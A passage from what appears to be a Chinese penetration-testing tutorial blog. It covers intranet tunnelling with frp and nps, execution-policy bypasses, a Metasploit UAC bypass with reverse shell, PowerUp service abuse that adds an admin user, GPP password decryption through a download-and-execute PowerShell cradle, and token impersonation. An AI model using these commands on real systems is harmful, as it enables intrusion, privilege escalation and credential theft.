src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609161458.png"></p><p>打开 frps 仪表盘，登录后，可以看到当前连接数据的相关信息</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609161859.png"></p><p>frp 的参数远不止文章中提到的这些，更多功能可以参考下面的参考文章。</p><h1 id="0x12-nps-的使用"><a href="#0x12-nps-的使用" class="headerlink" title="0x12 nps 的使用"></a>0x12 nps 的使用</h1><h2 id="1、介绍-5"><a href="#1、介绍-5" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>nps 项目地址：<a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><p>也是一款还在更新的内网穿透工具，相较于 frp，nps 的 web 管理就要强大很多了。</p><p>nps 和 frp 一样功能都很多，这里就主要记录下平时经常用到的 SOCKS5 代理模式。</p><h2 id="2、安装-2"><a href="#2、安装-2" class="headerlink" title="2、安装"></a>2、安装</h2><p>nps 不同于 frp 的开箱即用，nps 的服务端需要安装才能使用，这里以 kali 下的安装为例。</p><p>在 nps 项目的 releases 中下载好自己对应系统的版本后，解压安装</p><pre class="line-numbers language-none"><code class="language-none">tar -zxvf linux_amd64_server.tar.gz.&#x2F;nps install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、使用-2"><a href="#3、使用-2" class="headerlink" title="3、使用"></a>3、使用</h2><p>官方使用文档：<a href="https://ehang-io.github.io/nps">https://ehang-io.github.io/nps</a></p><p>启动服务端，默认 Web 管理界面端口 8080 </p><pre class="line-numbers language-none"><code class="language-none">nps start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动 nps 后，直接访问服务端的 8080 端口，输入默认密码 admin/123 进行登录，不难看出，这 web 界面确实比 frp 的丰富很多。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609170306.png"></p><p>nps 的使用也很简单，界面语言也可选择中文。</p><p>首先新增一个客户端，点击 “客户端” –》“新增”，打开新增客户端页面，填写相关信息后，点击新增即可</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609171610.png"></p><p>新增之后，刷新一下可以看到刚刚添加的记录，点击刚刚新增记录里的“加号”还能直接看到在客户端上要运行的命令，这个可谓是很贴心了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609172254.png"></p><p>复制命令到客户端上运行，服务端这边就能看到目标已经上线了，连接状态也由离线变成了在线。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609172144.png"></p><p>如果想创建一个 SOCKS5 代理也很简单，直接点击 “SOCKS 代理”–》“新增”，输入客户端的 ID 和代理的端口，然后新增即可。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609172512.png"></p><p>之后直接设置 SOCKS5 代理 IP 为 nps 服务端 IP ，端口这里设置的是 1080，这样就建立了一个 SOCKS 代理，如果新增设置客户端的时候，设置了认证账号密码，那么在连接 SOCKS 代理的时候，也要添加上对应的账号和密码。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609173211.png"></p><p>在这整个过程中都没有修改配置文件等等操作，真的是很方便了。</p><h1 id="0x13-内网中绕过无法上传文件限制"><a href="#0x13-内网中绕过无法上传文件限制" class="headerlink" title="0x13 内网中绕过无法上传文件限制"></a>0x13 内网中绕过无法上传文件限制</h1><h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe 程序编码成 base64 文本，将编码后的内容复制到目标主机后，再进行解码，这里记录下方法。</p><h2 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h2><p>使用 PowerShell 进行 base64 编码</p><pre class="line-numbers language-none"><code class="language-none">$PEBytes &#x3D; [System.IO.File]::ReadAllBytes(&quot;fscan.exe&quot;)$Base64Payload &#x3D; [System.Convert]::ToBase64String($PEBytes)Set-Content fscan_base64.txt -Value $Base64Payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 PowerShell 进行 base64 解码</p><pre class="line-numbers language-none"><code class="language-none">$Base64Bytes &#x3D; Get-Content (&quot;fscan_base64.txt&quot;)$PEBytes&#x3D; [System.Convert]::FromBase64String($Base64Bytes)[System.IO.File]::WriteAllBytes(&quot;fscan_base64.exe&quot;,$PEBytes)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210630172410.png"></p><h2 id="3、CertUtil"><a href="#3、CertUtil" class="headerlink" title="3、CertUtil"></a>3、CertUtil</h2><p>自 Windows 7 开始，Windows 自带了 CertUtil 命令，可以使用 CertUtil 进行 MD5、SHA1 等算法的计算，也可以使用 CertUtil 进行 base64 的编码，使用起来要比 PowerShell 方便不少。</p><p>使用 CertUtil 进行编码</p><pre class="line-numbers language-none"><code class="language-none">CertUtil -encode fscan.exe fscan_base64.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 CertUtil 进行解码</p><pre class="line-numbers language-none"><code class="language-none">CertUtil -decode fscan_base64.txt fscan_base64.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210630173155.png"> </p><h1 id="0x14-发现主机缺失补丁"><a href="#0x14-发现主机缺失补丁" class="headerlink" title="0x14 发现主机缺失补丁"></a>0x14 发现主机缺失补丁</h1><h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点，进而进行接下来的横向、提权等操作。</p><h2 id="1、手工发现缺失补丁"><a href="#1、手工发现缺失补丁" class="headerlink" title="1、手工发现缺失补丁"></a>1、手工发现缺失补丁</h2><h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>直接运行 systeminfo 命令，在「修补程序」（英文：Hotfix(s) ）处可以看到已安装的补丁。</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\teamssix&gt; systeminfo……内容过多，此处省略……修补程序: 安装了 2 个修补程序。         [01]: KB2999226         [02]: KB976902……内容过多，此处省略……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p>运行以下命令，同样可以看到当前系统打补丁的情况，显示的信息比 systeminfo 更详细直观。</p><pre class="line-numbers language-none"><code class="language-none">wmic qfe get Caption,Description,HotfixID,InstalledOn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\teamssix&gt;wmic qfe get Caption,Description,HotfixID,InstalledOnCaption                                     Description  HotFixID   InstalledOnhttp:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2999226  Update       KB2999226  11&#x2F;26&#x2F;2020http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;976902   Update       KB976902   11&#x2F;21&#x2F;2010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>知道了系统安装了哪些补丁，也就能反推出系统可能存在的漏洞了。</p><h2 id="2、自动发现缺失补丁"><a href="#2、自动发现缺失补丁" class="headerlink" title="2、自动发现缺失补丁"></a>2、自动发现缺失补丁</h2><h3 id="Sherlock-脚本"><a href="#Sherlock-脚本" class="headerlink" title="Sherlock 脚本"></a>Sherlock 脚本</h3><p>Sherlock 是一个在 Windows 下能够快速发现目标系统可能存在可被用于提权的漏洞的 PowerShell 脚本。</p><p>Sherlock 项目地址：<a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p><p>导入脚本</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Sherlock.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Sherlock 命令</p><pre class="line-numbers language-none"><code class="language-none">Find-ALLVulns搜索所有未安装的补丁Find-MS16032搜索单个漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在已经获取到目标会话后，比如这里的会话 Seesion ID 为 1，使用 post/windows/gather/enum_patches 模块可直接查看当前系统补丁信息。</p><pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; use post&#x2F;windows&#x2F;gather&#x2F;enum_patchesmsf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; set session 1session &#x3D;&gt; 1msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; run[+] KB2999226 installed on 11&#x2F;26&#x2F;2020[+] KB976902 installed on 11&#x2F;21&#x2F;2010[*] Post module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 MSF 发现目标可用提权漏洞，然后进行提权</p><p>首先查看下当前会话权限</p><pre class="line-numbers language-none"><code class="language-none">msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; sessions 1[*] Starting interaction with 1...meterpreter &gt; execute -if &quot;whoami &#x2F;groups&quot;Process 3048 created.Channel 6 created.组信息-----------------组名                                   类型   SID          属性&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组BUILTIN\Administrators                 别名   S-1-5-32-544 只用于拒绝的组BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组NT AUTHORITY\INTERACTIVE               已知组 S-1-5-4      必需的组, 启用于默认, 启用的组控制台登录                             已知组 S-1-2-1      必需的组, 启用于默认, 启用的组NT AUTHORITY\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组NT AUTHORITY\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组NT AUTHORITY\NTLM Authentication       已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组Mandatory Label\Medium Mandatory Level 标签   S-1-16-8192  必需的组, 启用于默认, 启用的组<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到当前权限为 Medium Mandatory Level，即普通权限</p><p>我们使用 post/multi/recon/local_exploit_suggester 模块检测下当前系统可利用的提权漏洞</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; background[*] Backgrounding session 1...msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggestermsf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; set session 1session &#x3D;&gt; 1msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; run[*] 172.16.214.4 - Collecting local exploits for x86&#x2F;windows...[*] 172.16.214.4 - 38 exploit checks are being tried...[+] 172.16.214.4 - exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr: The target appears to be vulnerable.[*] Post module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到提示存在 exploit/windows/local/bypassuac_eventvwr 模块可被利用</p><pre class="line-numbers language-none"><code class="language-none">msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr[*] Using configured payload windows&#x2F;meterpreter&#x2F;reverse_tcpmsf6 exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; set session 1session &#x3D;&gt; 1msf6 exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; run[*] Started reverse TCP handler on 10.101.22.38:4444[*] UAC is Enabled, checking level...[+] Part of Administrators group! Continuing...[+] UAC is set to Default[+] BypassUAC can bypass this setting, continuing...[*] Configuring payload and stager registry keys ...[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.[*] Sending stage (175174 bytes) to 172.16.214.4[*] Meterpreter session 2 opened (10.101.22.38:4444 -&gt; 172.16.214.4:49160) at 2021-07-06 15:38:08 +0800[*] Cleaning up registry keys ...meterpreter &gt; execute -if &quot;whoami &#x2F;groups&quot;Process 3048 created.Channel 1 created.组信息-----------------组名                                 类型   SID          属性&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Everyone                             已知组 S-1-1-0      必需的组, 启用于默认, 启用的组BUILTIN\Administrators               别名   S-1-5-32-544 必需的组, 启用于默认, 启用的组, 组的所有者BUILTIN\Users                        别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组NT AUTHORITY\INTERACTIVE             已知组 S-1-5-4      必需的组, 启用于默认, 启用的组控制台登录                           已知组 S-1-2-1      必需的组, 启用于默认, 启用的组NT AUTHORITY\Authenticated Users     已知组 S-1-5-11     必需的组, 启用于默认, 启用的组NT AUTHORITY\This Organization       已知组 S-1-5-15     必需的组, 启用于默认, 启用的组LOCAL                                已知组 S-1-2-0      必需的组, 启用于默认, 启用的组NT AUTHORITY\NTLM Authentication     已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组Mandatory Label\High Mandatory Level 标签   S-1-16-12288 必需的组, 启用于默认, 启用的组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，使用 exploit/windows/local/bypassuac_eventvwr 模块直接将目标权限提升到了 High Mandatory Level，即管理员权限，这里可以说 MSF 很方便了。</p><h3 id="wesng"><a href="#wesng" class="headerlink" title="wesng"></a>wesng</h3><p>wesng 被称为 Windows Exploit Suggester 的下一代，wesng 和 Windows Exploit Suggester 的使用方法基本一致，但 wesng 所支持的操作系统更丰富，不过实测 wesng 还未支持 Windows 11 『手动狗头』</p><p>wesng 的安装方法也很简单</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;bitsadmin&#x2F;wesng.gitcd wesngpython wes.py --update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用起来也很简单，直接在目标主机上运行以下命令，将 systeminfo 的信息保存到 txt 中。</p><pre class="line-numbers language-none"><code class="language-none">systeminfo &gt; info.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接使用 wesng 即可</p><pre class="line-numbers language-none"><code class="language-none">python wes.py info.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210706145250.png"></p><p>使用 wesng 可以直接看到目标主机可能存在的 CVE 漏洞，从而便于我们有针对性的利用这些漏洞。</p><h1 id="0x15-系统服务权限配置不当利用"><a href="#0x15-系统服务权限配置不当利用" class="headerlink" title="0x15 系统服务权限配置不当利用"></a>0x15 系统服务权限配置不当利用</h1><h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><p>PowerUp 可以用来寻找目标中权限配置不当的服务，下载地址：<a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1</a></p><p>在 PowerShell 中导入并执行脚本</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerUp.ps1Invoke-AllChecks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;[*] Running Invoke-AllChecks[*] Checking if user is in a local group with administrative privileges...[+] User is in a local group that grants administrative privileges![+] Run a BypassUAC attack to elevate privileges to admin.[*] Checking for unquoted service paths...[*] Checking service executable and argument permissions...ServiceName    : MongoDBPath           : C:\Web\mongodb\bin\mongod.exe --auth --config C:\Web\mongodb\mongod.conf --s                 erviceModifiableFile : C:\Web\mongodb\mongod.confStartName      : LocalSystemAbuseFunction  : Install-ServiceBinary -ServiceName &#39;MongoDB&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于结果可能比较长，因此也可以将其保存到 txt 文件里，方便查看</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks | Out-File -Encoding ASCII result.txt&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从检查的结果可以看出 MongoDB 服务存在漏洞，利用 Install-ServiceBinary 模块，通过 PowerUp 利用该处权限配置不当添加管理员用户。</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;ServiceName                   ServicePath                   Command                       BackupPath-----------                   -----------                   -------                       ----------MongoDB                       C:\Web\mongodb\bin\mongod...  net user test Passw0rd &#x2F;ad... C:\Web\mongodb\bin\mongod...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重启系统，查看用户，发现 test 已经被添加到管理员组了。</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; net user test用户名                 test全名……本地组成员             *Administrators       *Users全局组成员             *None命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Metasploit-1"><a href="#Metasploit-1" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在 MSF 中，先看下已上线主机的权限</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; getuidServer username: TEAMSSIX\dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>MSF 中对应服务权限配置不当的利用模块是 <code>exploit/windows/local/service_permissions</code></p><p>利用步骤如下：</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;service_permissionsset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.7.1set lport 4444set session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210722172401.png"></p><p>可以看到会话直接被提升到了 SYSTEM 权限。</p><h1 id="0x16-组策略凭据获取"><a href="#0x16-组策略凭据获取" class="headerlink" title="0x16 组策略凭据获取"></a>0x16 组策略凭据获取</h1><h2 id="0、前言-1"><a href="#0、前言-1" class="headerlink" title="0、前言"></a>0、前言</h2><p>SYSVOL 是活动目录里的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制，SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录域范围内共享，所有的域策略均存放在 C:\Windows\SYSVOL\DOMAIN\Policies\ 目录中。</p><p>管理员在域中新建一个组策略后，系统会自动在 SYSVOL 目录中生成一个 XML 文件。</p><p>该文件中保存了该组策略更新后的密码，该密码使用 AES-256 算法，但 2012 年微软公布了该密码的私钥，也就是说任何人都可以对其进行解密。</p><h2 id="1、查找包含-cpassword-的-XML-文件"><a href="#1、查找包含-cpassword-的-XML-文件" class="headerlink" title="1、查找包含 cpassword 的 XML 文件"></a>1、查找包含 cpassword 的 XML 文件</h2><p>浏览 SYSVOL 文件夹，手动查找包含 cpassword 的 XML 文件</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728141704.png"></p><p>或者使用 findstr 自动搜索包含 cpassword 的 XML 文件</p><pre class="line-numbers language-none"><code class="language-none">findstr &#x2F;s &#x2F;i &quot;cpassword&quot; C:\Windows\SYSVOL\*.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728142511.png"></p><h2 id="2、解密-cpassword-密文"><a href="#2、解密-cpassword-密文" class="headerlink" title="2、解密 cpassword 密文"></a>2、解密 cpassword 密文</h2><h3 id="python-脚本"><a href="#python-脚本" class="headerlink" title="python 脚本"></a>python 脚本</h3><p> Gpprefdecrypt.py 下载地址：<a href="https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py">https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py</a></p><pre class="line-numbers language-none"><code class="language-none">python2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728143302.png"></p><h3 id="PowerShell-脚本"><a href="#PowerShell-脚本" class="headerlink" title="PowerShell 脚本"></a>PowerShell 脚本</h3><p>PowerSploit 项目中提供了 Get-GPPPassword.ps1 脚本。</p><p>脚本下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p><p>直接远程下载脚本执行：</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果无法下载可以使用 github 代理</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728144214.png"></p><p>或者下载到本地，执行也行</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-GPPPassword.ps1Get-GPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>使用 post/windows/gather/credentials/gpp 模块也可以</p><pre class="line-numbers language-none"><code class="language-none">use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gppset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728145138.png"></p><h1 id="0x17-令牌窃取"><a href="#0x17-令牌窃取" class="headerlink" title="0x17 令牌窃取"></a>0x17 令牌窃取</h1><h2 id="0、前言-2"><a href="#0、前言-2" class="headerlink" title="0、前言"></a>0、前言</h2><p>令牌（Token）是指系统中的临时秘钥，相当于账户和密码，有了令牌就可以在不知道密码的情况下访问目标相关资源了，这些令牌将持续存在于系统中，除非系统重新启动。</p><h2 id="1、MSF"><a href="#1、MSF" class="headerlink" title="1、MSF"></a>1、MSF</h2><p>在获取到 Meterpreter Shell 后，使用以下命令获取令牌</p><pre class="line-numbers language-none"><code class="language-none">load incognitolist_tokens -u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729095721.png"></p><p>这里有两种令牌，一个是 Delegation Tokens 即授权令牌，还有一种是 Impersonation Tokens 即模拟令牌。前者支持交互式登录比如远程桌面，后者支持非交互的会话。</p><p>令牌获取的数量取决于获取到 Shell 的权限等级。</p><p>如果已经获取到了 SYSTEM 权限的令牌，那么攻击者就可以伪造这个令牌，拥有对应的权限。</p><pre class="line-numbers language-none"><code class="language-none">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729100415.png"></p><p>可以看到我们已经通过伪造 SYSTEM 的令牌拿到 SYSTEM 权限了。</p><p>不过值得注意的是，如果不加双引号，\ 需要改成 <code>\\</code> 才行，个人猜测可能是因为 \ 被当做转义字符处理的原因。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729100653.png"></p><h2 id="2、Rotten-Potato-本地提权"><a href="#2、Rotten-Potato-本地提权" class="headerlink" title="2、Rotten Potato 本地提权"></a>2、Rotten Potato 本地提权</h2><p>Rotten Potato 直译过来就烂土豆的意思，如果目标中存在有效的令牌，就可以通过 Rotten Potato 模拟用户令牌实现提权。</p><p>Rotten Potato 项目地址：<a href="https://github.com/breenmachine/RottenPotatoNG">https://github.com/breenmachine/RottenPotatoNG</a></p><p>运行 RottenPotato.exe 直接弹出 SYSTEM 权限的 CMD 窗口，不需要用到 MSF。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729101949.png"></p><h1 id="0x18-LLMNR-和-NetBIOS-欺骗攻击"><a href="#0x18-LLMNR-和-NetBIOS-欺骗攻击" class="headerlink" title="0x18 LLMNR 和 NetBIOS 欺骗攻击"></a>0x18 LLMNR 和 NetBIOS 欺骗攻击</h1><h2 id="0、前言-3"><a href="#0、前言-3" class="headerlink" title="0、前言"></a>0、前言</h2><p>如果已经进入目标网络，但是没有获得凭证，可以使用 LLMNR 和 NetBIOS 欺骗攻击对目标进行无凭证条件下的权限获取。</p><h2 id="1、基本概念"><a href="#1、基本概念" class="headerlink" title="1、基本概念"></a>1、基本概念</h2><h3 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h3><p>本地链路多播名称解析（LLMNR）是一种域名系统数据包格式，当局域网中的 DNS 服务器不可用时，DNS 客户端就会使用 LLMNR 解析本地网段中机器的名称，直到 DNS 服务器恢复正常为止。</p><p>从 Windows Vista 开始支持 LLMNR ，Linux 系统也通过 systemd 实现了此协议，同时 LLMNR 也支持 IPv6。</p><h3 id="NetBIOS"><a href="#NetBIOS" 